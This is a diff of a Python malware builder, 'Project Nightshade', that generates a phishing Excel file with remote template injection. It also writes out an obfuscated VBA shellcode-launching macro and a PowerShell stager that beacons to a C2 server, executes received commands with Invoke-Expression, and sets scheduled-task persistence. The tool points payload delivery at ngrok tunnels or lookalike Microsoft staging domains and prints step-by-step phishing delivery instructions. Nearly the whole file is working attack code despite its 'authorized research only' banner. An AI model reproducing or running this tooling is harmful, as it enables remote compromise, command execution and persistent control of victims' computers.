@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Project Nightshade - Advanced Excel Dropper with Ngrok Support
+Project Nightshade - Advanced Excel Dropper with Interactive Prompts
 Author: ek0ms savi0r | OPSEC Grade: Midnight
 Description:
     Creates an Excel file with OLE template injection that deploys an in-memory,
     fileless payload with persistence and encrypted C2 capabilities.
-    Supports both ngrok tunneling and domain rotation for maximum flexibility.
+    Interactive version with user prompts for easy configuration.
 """
 import os
 import sys
@@ -18,20 +18,92 @@ import base64
 import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-import argparse
 import requests
 
-# Configuration
-CONFIG = {
-    'c2_server': base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8'),
-    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'checkin_interval': '3600',
-    'persistence_method': 'scheduled_task',
-    'encryption_key': 'nightshade-midnight-love-2023',
-    'use_ngrok': True,  # Set to False to force domain rotation
-}
+def prompt_user():
+    """Interactive prompt for user configuration"""
+    print('''
+    ╔══════════════════════════════════════════════════════════╗
+    ║                   PROJECT NIGHTSHADE                     ║
+    ║                 Advanced Excel Dropper                   ║
+    ║                   by : ek0ms savi0r                      ║
+    ╚══════════════════════════════════════════════════════════╝
+    ''')
+    
+    print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
+    print("[!] This tool creates malicious documents for penetration testing")
+    print("\n" + "="*60)
+    
+    # Get output filename
+    output_file = input("\n[?] Output filename [Financial_Report_Q3.xlsx]: ").strip()
+    if not output_file:
+        output_file = 'Financial_Report_Q3.xlsx'
+    
+    # Get C2 server
+    c2_server = input("[?] C2 Server URL [https://example.com/command]: ").strip()
+    if not c2_server:
+        c2_server = base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8')
+    
+    # Get encryption key
+    encryption_key = input("[?] Encryption key [nightshade-midnight-love-2023]: ").strip()
+    if not encryption_key:
+        encryption_key = 'nightshade-midnight-love-2023'
+    
+    # Choose delivery method
+    print("\n[?] Choose delivery method:")
+    print("    1. Ngrok tunneling (recommended for quick operations)")
+    print("    2. Domain rotation (for persistent campaigns)")
+    print("    3. Custom domain")
+    
+    delivery_choice = input("[?] Enter choice [1]: ").strip()
+    if not delivery_choice:
+        delivery_choice = '1'
+    
+    custom_domain = None
+    use_ngrok = True
+    
+    if delivery_choice == '1':
+        use_ngrok = True
+        print("[+] Selected: Ngrok tunneling")
+    elif delivery_choice == '2':
+        use_ngrok = False
+        print("[+] Selected: Domain rotation")
+    elif delivery_choice == '3':
+        use_ngrok = False
+        custom_domain = input("[?] Enter custom domain: ").strip()
+        if not custom_domain:
+            print("[-] No domain provided, using domain rotation")
+        else:
+            print(f"[+] Selected: Custom domain ({custom_domain})")
+    else:
+        print("[-] Invalid choice, using ngrok tunneling")
+        use_ngrok = True
+    
+    # Confirm settings
+    print("\n" + "="*60)
+    print("[+] Configuration Summary:")
+    print(f"    Output file: {output_file}")
+    print(f"    C2 Server: {c2_server}")
+    print(f"    Encryption key: {encryption_key}")
+    print(f"    Delivery method: {'Ngrok' if use_ngrok else 'Domain rotation'}")
+    if custom_domain:
+        print(f"    Custom domain: {custom_domain}")
+    
+    confirm = input("\n[?] Proceed with these settings? (y/N): ").strip().lower()
+    if confirm not in ['y', 'yes']:
+        print("[-] Operation cancelled")
+        sys.exit(0)
+    
+    return {
+        'output_file': output_file,
+        'c2_server': c2_server,
+        'encryption_key': encryption_key,
+        'use_ngrok': use_ngrok,
+        'custom_domain': custom_domain
+    }
 
-# Domain rotation for fallback
+# Configuration will be set by user prompts
+CONFIG = {}
 STAGING_DOMAINS = [
     'cdn.microsoft-update.com',
     'assets-windows.net',
@@ -68,6 +140,15 @@ def create_remote_template_injection():
     
     return external_link
 
+def create_custom_domain_injection(domain):
+    """Create external link using custom domain"""
+    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <externalBook name="https://{domain}/template.ole" r:id="rId1"/>
+</externalLink>'''
+    
+    return external_link
+
 def create_ngrok_template_injection():
     """Create external link pointing to ngrok tunnel"""
     ngrok_url = get_ngrok_tunnel_url()
@@ -95,7 +176,7 @@ def encrypt_payload(payload, key):
 
 def create_embedded_macro():
     """Create heavily obfuscated VBA macro"""
-    vba_code = '''
+    vba_code = f'''
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
     ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
     ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
@@ -122,7 +203,7 @@ Sub NightshadeInitialize()
     
     ' Extract encrypted payload from document metadata
     payload = ThisWorkbook.CustomDocumentProperties("AnalysisData")
-    key = "''' + CONFIG['encryption_key'] + '''"
+    key = "{CONFIG['encryption_key']}"
     
     ' Decrypt and execute
     decodedData = Base64Decode(payload)
@@ -181,11 +262,11 @@ End Sub
 
 def create_powershell_stager():
     """Create PowerShell stager for C2 communications"""
-    ps_stager = '''
-$key = [System.Text.Encoding]::UTF8.GetBytes('''' + CONFIG['encryption_key'] + '''')
+    ps_stager = f'''
+$key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
 $iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')
 
-function Encrypt-Data($data) {
+function Encrypt-Data($data) {{
     $aes = New-Object System.Security.Cryptography.AesManaged
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
@@ -194,9 +275,9 @@ function Encrypt-Data($data) {
     $encryptor = $aes.CreateEncryptor()
     $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
     [System.Convert]::ToBase64String($encrypted)
-}
+}}
 
-function Decrypt-Data($encryptedData) {
+function Decrypt-Data($encryptedData) {{
     $bytes = [System.Convert]::FromBase64String($encryptedData)
     $aes = New-Object System.Security.Cryptography.AesManaged
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -206,33 +287,33 @@ function Decrypt-Data($encryptedData) {
     $decryptor = $aes.CreateDecryptor()
     $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
     [System.Text.Encoding]::UTF8.GetString($decrypted)
-}
+}}
 
-function Establish-C2Connection {
+function Establish-C2Connection {{
     $sessionId = [System.Guid]::NewGuid().ToString()
-    while ($true) {
-        try {
-            $response = Invoke-WebRequest -Uri "''' + CONFIG['c2_server'] + '''" -Method POST -Headers @{
-                "User-Agent" = "''' + CONFIG['user_agent'] + '''"
+    while ($true) {{
+        try {{
+            $response = Invoke-WebRequest -Uri "{CONFIG['c2_server']}" -Method POST -Headers @{{
+                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 "X-Session-ID" = $sessionId
-            } -Body (Encrypt-Data "checkin") -UseBasicParsing
+            }} -Body (Encrypt-Data "checkin") -UseBasicParsing
             
             $command = Decrypt-Data $response.Content
-            if ($command -ne "noop") {
+            if ($command -ne "noop") {{
                 $result = Invoke-Expression $command 2>&1 | Out-String
                 $encryptedResult = Encrypt-Data $result
                 
-                Invoke-WebRequest -Uri "''' + CONFIG['c2_server'] + '''" -Method POST -Headers @{
-                    "User-Agent" = "''' + CONFIG['user_agent'] + '''"
+                Invoke-WebRequest -Uri "{CONFIG['c2_server']}" -Method POST -Headers @{{
+                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     "X-Session-ID" = $sessionId
-                } -Body $encryptedResult -UseBasicParsing
-            }
-        } catch {
+                }} -Body $encryptedResult -UseBasicParsing
+            }}
+        }} catch {{
             # Silent error handling
-        }
-        Start-Sleep -Seconds ''' + CONFIG['checkin_interval'] + '''
-    }
-}
+        }}
+        Start-Sleep -Seconds 3600
+    }}
+}}
 
 # Establish persistence
 $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$(Get-Content -Path '$PSCommandPath' | Select-Object -Skip 1 | Out-String)`""
@@ -246,13 +327,13 @@ Establish-C2Connection
 '''
     return ps_stager
 
-def create_malicious_excel(output_file):
+def create_malicious_excel(output_file, use_ngrok, custom_domain=None):
     """Create Excel file with OLE template injection and embedded payload"""
 
     with tempfile.TemporaryDirectory() as tmpdir:
         excel_structure = {
             '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
-            '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
+            '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes?>',
             'xl/workbook.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
             'xl/_rels/workbook.xml.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
             'xl/worksheets/sheet1.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
@@ -290,10 +371,17 @@ def create_malicious_excel(output_file):
         with open(os.path.join(tmpdir, 'xl/_rels/workbook.xml.rels'), 'w') as f:
             f.write(workbook_rels)
 
-        if CONFIG['use_ngrok']:
+        template_source = ""
+        template_url = ""
+        
+        if use_ngrok:
             external_link = create_ngrok_template_injection()
             template_source = "ngrok tunnel"
             template_url = get_ngrok_tunnel_url() or "Unknown (using fallback)"
+        elif custom_domain:
+            external_link = create_custom_domain_injection(custom_domain)
+            template_source = "custom domain"
+            template_url = f"https://{custom_domain}/template.ole"
         else:
             external_link = create_remote_template_injection()
             template_source = "domain rotation"
@@ -339,54 +427,40 @@ def create_malicious_excel(output_file):
                     arcname = os.path.relpath(file_path, tmpdir)
                     zipf.write(file_path, arcname)
         
-        print(f"[+] Created advanced Excel dropper: {output_file}")
+        print(f"\n[+] Created advanced Excel dropper: {output_file}")
         print(f"[+] Payload encrypted with key: {CONFIG['encryption_key']}")
         print(f"[+] C2 Server: {CONFIG['c2_server']}")
         print(f"[+] Template Source: {template_source}")
         print(f"[+] Template URL: {template_url}")
 
 def main():
-    """Main function"""
-    parser = argparse.ArgumentParser(description='Generate advanced Excel dropper')
-    parser.add_argument('-o', '--output', default='Financial_Report_Q3.xlsx',
-                       help='Output filename')
-    parser.add_argument('--c2', help='C2 server URL')
-    parser.add_argument('--key', help='Encryption key')
-    parser.add_argument('--domain', help='Specific staging domain to use')
-    parser.add_argument('--no-ngrok', action='store_true', help='Disable ngrok and use domain rotation')
-    
-    args = parser.parse_args()
-    
-    if args.c2:
-        CONFIG['c2_server'] = args.c2
-    if args.key:
-        CONFIG['encryption_key'] = args.key
-    if args.domain:
-        global STAGING_DOMAINS
-        STAGING_DOMAINS = [args.domain]
-    if args.no_ngrok:
-        CONFIG['use_ngrok'] = False
-    
-    print('''
-    ╔══════════════════════════════════════════════════════════╗
-    ║                   PROJECT NIGHTSHADE                     ║
-    ║                 Advanced Excel Dropper                   ║
-    ║                   by : ek0ms savi0r                      ║
-    ╚══════════════════════════════════════════════════════════╝
-    ''')
-    
-    print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
-    print("[!] This tool creates malicious documents for penetration testing")
-
-    if CONFIG['use_ngrok']:
-        ngrok_url = get_ngrok_tunnel_url()
-        if ngrok_url:
-            print(f"[+] Ngrok tunnel detected: {ngrok_url}")
-        else:
-            print("[!] Ngrok tunnel not found - falling back to domain rotation")
-    
+    """Main function with interactive prompts"""
     try:
-        create_malicious_excel(args.output)
+        user_config = prompt_user()
+
+        global CONFIG
+        CONFIG = {
+            'c2_server': user_config['c2_server'],
+            'encryption_key': user_config['encryption_key'],
+            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'checkin_interval': '3600'
+        }
+
+        if user_config['use_ngrok']:
+            ngrok_url = get_ngrok_tunnel_url()
+            if ngrok_url:
+                print(f"[+] Ngrok tunnel detected: {ngrok_url}")
+            else:
+                print("[!] Ngrok tunnel not found - falling back to domain rotation")
+                user_config['use_ngrok'] = False
+        
+        # Create the malicious Excel file
+        create_malicious_excel(
+            user_config['output_file'],
+            user_config['use_ngrok'],
+            user_config['custom_domain']
+        )
+        
         print("\n[+] Delivery Instructions:")
         print("    1. Deliver the Excel file via phishing campaign")
         print("    2. When opened, it will attempt to load remote template")
@@ -394,15 +468,21 @@ def main():
         print("    4. Template executes encrypted in-memory payload")
         print("    5. Payload establishes persistence and C2 connection")
         
-        if CONFIG['use_ngrok']:
+        if user_config['use_ngrok']:
             print("    6. Using ngrok tunneling for infrastructure-less deployment")
+        elif user_config['custom_domain']:
+            print(f"    6. Using custom domain: {user_config['custom_domain']}")
         else:
             print("    6. Using domain rotation for OPSEC")
+            
+        print("\n[!] Remember to start the staging server before deployment!")
         
     except Exception as e:
         print(f"[-] Error: {e}")
         print("[-] Ensure all dependencies are installed")
         print("[-] pip install pycryptodome requests")
+    except KeyboardInterrupt:
+        print("\n[-] Operation cancelled by user")
 
 if __name__ == "__main__":
     main()
